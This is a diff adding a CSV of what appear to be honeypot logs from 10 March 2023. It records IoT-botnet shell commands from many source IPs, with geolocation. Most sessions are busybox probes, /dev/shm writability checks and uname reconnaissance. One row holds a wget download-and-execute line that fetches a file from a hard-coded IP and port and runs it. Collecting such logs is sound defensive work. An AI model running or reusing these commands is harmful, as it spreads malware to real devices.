@@ -1,0 +1,587 @@
+@timestamp,input.keyword,src_ip,geoip.city_name,geoip.country_name
+"Mar 10, 2023 @ 21:54:33.374",rm .s; exit,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:33.371",/bin/busybox RIQIC,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:33.090",while read i,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:33.088",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:32.802",tftp; wget; /bin/busybox RIQIC,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:32.517",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RIQIC,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:32.228",cat /proc/mounts; /bin/busybox RIQIC,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:31.943",sh,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:31.943",shell,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:31.942",shell,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:31.941",system,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:31.940",system,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:54:31.938",enable,36.104.222.34,Changchun,China
+"Mar 10, 2023 @ 21:12:08.421",rm .s; exit,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:08.418",/bin/busybox WPUKO,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:08.178",while read i,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:08.175",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:07.932",tftp; wget; /bin/busybox WPUKO,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:07.691",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WPUKO,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:07.448",cat /proc/mounts; /bin/busybox WPUKO,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:07.208",sh,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:07.207",shell,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:07.206",shell,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:07.206",system,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:07.205",system,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:12:07.202",enable,149.113.219.137,-,United States
+"Mar 10, 2023 @ 21:05:23.524",/bin/busybox LDWDD,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:23.323",while read i,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:23.321",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:23.109",tftp; wget; /bin/busybox LDWDD,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:22.907",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LDWDD,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:22.696",cat /proc/mounts; /bin/busybox LDWDD,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:22.492",sh,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:22.491",shell,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:22.490",shell,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:22.489",system,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:22.488",system,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 21:05:22.486",enable,121.224.132.3,Suzhou,China
+"Mar 10, 2023 @ 20:12:14.063",rm .s; exit,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:14.059",/bin/busybox NZTSS,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:13.835",while read i,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:13.832",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:13.602",tftp; wget; /bin/busybox NZTSS,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:13.370",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NZTSS,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:13.135",cat /proc/mounts; /bin/busybox NZTSS,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:12.908",sh,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:12.907",shell,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:12.906",shell,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:12.906",system,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:12.905",system,110.182.240.122,-,China
+"Mar 10, 2023 @ 20:12:12.903",enable,110.182.240.122,-,China
+"Mar 10, 2023 @ 19:52:09.508",uname -a,34.100.196.131,-,United States
+"Mar 10, 2023 @ 19:21:19.022",/bin/busybox VJVHG,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:18.779",while read i,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:18.776",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:18.525",tftp; wget; /bin/busybox VJVHG,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:18.264",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VJVHG,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:18.013",cat /proc/mounts; /bin/busybox VJVHG,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:17.767",sh,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:17.766",shell,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:17.765",shell,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:17.764",system,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:17.764",system,113.26.83.201,-,China
+"Mar 10, 2023 @ 19:21:17.762",enable,113.26.83.201,-,China
+"Mar 10, 2023 @ 18:57:33.708",rm .s; exit,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:33.695",/bin/busybox RQBTB,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:33.494",while read i,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:33.491",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:33.263",tftp; wget; /bin/busybox RQBTB,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:32.958",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RQBTB,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:32.738",cat /proc/mounts; /bin/busybox RQBTB,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:32.527",sh,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:32.526",shell,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:32.525",system,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:32.525",shell,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:32.524",system,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:57:32.522",enable,180.115.40.152,Changzhou,China
+"Mar 10, 2023 @ 18:18:11.457",rm .s; exit,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:11.453",/bin/busybox AOAEM,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:11.261",while read i,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:11.258",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:11.059",tftp; wget; /bin/busybox AOAEM,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:10.861",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AOAEM,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:10.635",cat /proc/mounts; /bin/busybox AOAEM,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:10.437",sh,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:10.436",shell,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:10.436",shell,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:10.435",system,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:10.434",system,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:18:10.432",enable,222.93.242.99,Suzhou,China
+"Mar 10, 2023 @ 18:17:36.525",rm .s; exit,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:36.513",/bin/busybox DRKCW,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:36.274",while read i,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:36.271",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:36.015",tftp; wget; /bin/busybox DRKCW,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:35.775",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DRKCW,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:35.463",cat /proc/mounts; /bin/busybox DRKCW,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:35.206",sh,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:35.204",shell,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:35.203",shell,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:35.201",system,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:35.200",system,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 18:17:35.198",enable,113.25.207.164,Zhongshan,China
+"Mar 10, 2023 @ 17:00:15.427",rm .s; exit,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:15.418",/bin/busybox TPGZX,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:15.163",while read i,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:15.160",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:14.898",tftp; wget; /bin/busybox TPGZX,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:14.639",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TPGZX,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:14.375",cat /proc/mounts; /bin/busybox TPGZX,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:14.119",sh,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:14.118",shell,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:14.117",shell,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:14.116",system,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:14.115",system,110.180.153.131,-,China
+"Mar 10, 2023 @ 17:00:14.113",enable,110.180.153.131,-,China
+"Mar 10, 2023 @ 16:40:34.993",rm .s; exit,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:34.991",/bin/busybox KZGRX,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:34.757",while read i,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:34.754",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:34.516",tftp; wget; /bin/busybox KZGRX,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:34.279",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KZGRX,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:34.022",cat /proc/mounts; /bin/busybox KZGRX,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:33.787",sh,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:33.786",shell,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:33.786",shell,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:33.785",system,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:33.784",system,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:40:33.782",enable,183.15.91.89,Shenzhen,China
+"Mar 10, 2023 @ 16:32:32.640",rm .s; exit,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:32.638",/bin/busybox GAOPP,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:32.437",while read i,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:32.434",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:32.230",tftp; wget; /bin/busybox GAOPP,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:32.028",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GAOPP,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:31.823",cat /proc/mounts; /bin/busybox GAOPP,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:31.622",sh,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:31.621",shell,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:31.621",shell,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:31.620",system,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:31.619",system,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:32:31.617",enable,49.168.22.221,-,South Korea
+"Mar 10, 2023 @ 16:14:15.735",rm .s; exit,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:15.733",/bin/busybox QLCFH,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:15.486",while read i,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:15.483",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:15.231",tftp; wget; /bin/busybox QLCFH,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:14.978",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QLCFH,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:14.691",cat /proc/mounts; /bin/busybox QLCFH,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:14.443",sh,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:14.442",shell,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:14.442",shell,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:14.441",system,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:14.440",system,175.30.116.184,-,China
+"Mar 10, 2023 @ 16:14:14.438",enable,175.30.116.184,-,China
+"Mar 10, 2023 @ 15:57:40.578",rm .s; exit,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:40.568",/bin/busybox YPNEM,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:40.357",while read i,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:40.354",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:40.134",tftp; wget; /bin/busybox YPNEM,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:39.919",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YPNEM,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:39.689",cat /proc/mounts; /bin/busybox YPNEM,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:39.448",shell,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:39.448",sh,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:39.447",shell,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:39.446",system,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:39.445",system,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:57:39.443",enable,180.118.216.230,-,China
+"Mar 10, 2023 @ 15:03:31.407",rm .s; wget http://1.77.61.195:46084/.i; chmod 777 .i; ./.i; exit,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:31.280",/bin/busybox JQRVF,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:31.154",while read i,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:31.150",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:31.025",tftp; wget; /bin/busybox JQRVF,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:30.897",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JQRVF,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:30.769",cat /proc/mounts; /bin/busybox JQRVF,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:30.644",sh,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:30.643",shell,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:30.642",system,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:30.642",shell,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:30.641",system,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 15:03:30.639",enable,190.109.236.80,La Paz,Bolivia
+"Mar 10, 2023 @ 14:55:01.107",rm .s; exit,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:55:01.101",/bin/busybox UHMQI,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:55:00.854",while read i,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:55:00.851",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:55:00.600",tftp; wget; /bin/busybox UHMQI,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:55:00.343",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UHMQI,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:55:00.088",cat /proc/mounts; /bin/busybox UHMQI,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:54:59.832",sh,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:54:59.831",shell,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:54:59.831",shell,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:54:59.830",system,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:54:59.829",system,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:54:59.827",enable,113.26.227.29,-,China
+"Mar 10, 2023 @ 14:46:04.263",rm .s; exit,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:04.261",/bin/busybox YFLZC,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:03.975",while read i,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:03.972",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:03.671",tftp; wget; /bin/busybox YFLZC,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:03.381",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YFLZC,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:03.078",cat /proc/mounts; /bin/busybox YFLZC,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:02.791",sh,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:02.790",shell,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:02.789",shell,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:02.788",system,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:02.787",system,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:46:02.785",enable,117.214.255.181,-,India
+"Mar 10, 2023 @ 14:37:39.496",cat /bin/echo;,109.206.243.207,-,Germany
+"Mar 10, 2023 @ 13:42:54.372",rm .s; exit,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:54.370",/bin/busybox YWKJN,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:54.086",while read i,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:54.082",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:53.786",tftp; wget; /bin/busybox YWKJN,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:53.500",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YWKJN,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:53.211",cat /proc/mounts; /bin/busybox YWKJN,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:52.925",sh,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:52.924",shell,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:52.923",shell,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:52.922",system,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:52.921",system,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 13:42:52.919",enable,117.205.96.94,Meerut,India
+"Mar 10, 2023 @ 12:57:40.670",uname -s -v -n -r -m,123.156.231.91,Jinhua,China
+"Mar 10, 2023 @ 12:30:36.337",uname -a,8.213.24.214,Singapore,Singapore
+"Mar 10, 2023 @ 12:16:32.670",rm .s; exit,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:32.668",/bin/busybox MJXGE,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:32.401",while read i,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:32.398",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:32.124",tftp; wget; /bin/busybox MJXGE,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:31.846",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MJXGE,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:31.561",cat /proc/mounts; /bin/busybox MJXGE,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:31.277",sh,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:31.276",shell,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:31.275",shell,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:31.275",system,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:31.274",system,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:16:31.272",enable,42.243.253.211,-,China
+"Mar 10, 2023 @ 12:10:44.281",/bin/busybox PEIFN,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:44.047",while read i,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:44.042",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:43.789",tftp; wget; /bin/busybox PEIFN,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:43.546",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PEIFN,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:43.295",cat /proc/mounts; /bin/busybox PEIFN,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:43.054",sh,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:43.053",shell,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:43.052",shell,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:43.051",system,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:43.050",system,110.178.37.27,-,China
+"Mar 10, 2023 @ 12:10:43.046",enable,110.178.37.27,-,China
+"Mar 10, 2023 @ 11:09:45.513",uname -s -v -n -r -m,47.243.63.173,San Mateo,United States
+"Mar 10, 2023 @ 10:29:59.608",rm .s; exit,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:59.552",/bin/busybox BDEXQ,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:59.328",while read i,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:59.270",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:58.991",tftp; wget; /bin/busybox BDEXQ,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:58.720",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BDEXQ,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:58.440",cat /proc/mounts; /bin/busybox BDEXQ,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:58.176",shell,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:58.176",sh,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:58.175",shell,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:58.124",system,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:58.105",system,222.241.50.50,-,China
+"Mar 10, 2023 @ 10:29:58.103",enable,222.241.50.50,-,China
+"Mar 10, 2023 @ 09:32:59.196",rm .s; exit,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:59.184",/bin/busybox EEQUZ,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:58.970",while read i,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:58.939",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:58.711",tftp; wget; /bin/busybox EEQUZ,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:58.459",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox EEQUZ,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:58.218",cat /proc/mounts; /bin/busybox EEQUZ,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:57.997",sh,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:57.996",shell,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:57.995",shell,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:57.994",system,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:57.993",system,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:32:57.991",enable,117.80.126.215,Suzhou,China
+"Mar 10, 2023 @ 09:11:52.321",/bin/busybox RVZEV,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:52.087",while read i,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:52.084",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:51.845",tftp; wget; /bin/busybox RVZEV,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:51.610",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RVZEV,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:51.371",cat /proc/mounts; /bin/busybox RVZEV,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:51.137",sh,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:51.137",shell,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:51.136",shell,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:51.135",system,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:51.134",system,110.181.75.222,-,China
+"Mar 10, 2023 @ 09:11:51.132",enable,110.181.75.222,-,China
+"Mar 10, 2023 @ 08:40:58.433",/bin/busybox LFOHI,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:58.208",while read i,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:58.204",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:57.977",tftp; wget; /bin/busybox LFOHI,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:57.747",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LFOHI,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:57.501",cat /proc/mounts; /bin/busybox LFOHI,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:57.268",sh,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:57.267",shell,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:57.267",shell,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:57.266",system,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:57.265",system,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:40:57.263",enable,49.70.13.51,-,China
+"Mar 10, 2023 @ 08:04:44.552",rm .s; exit,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:44.515",/bin/busybox TJKDS,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:44.270",while read i,223.8.205.227,-,China
+"Mar 10, 2023 @ 08:04:44.263",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,223.8.205.227,-,China
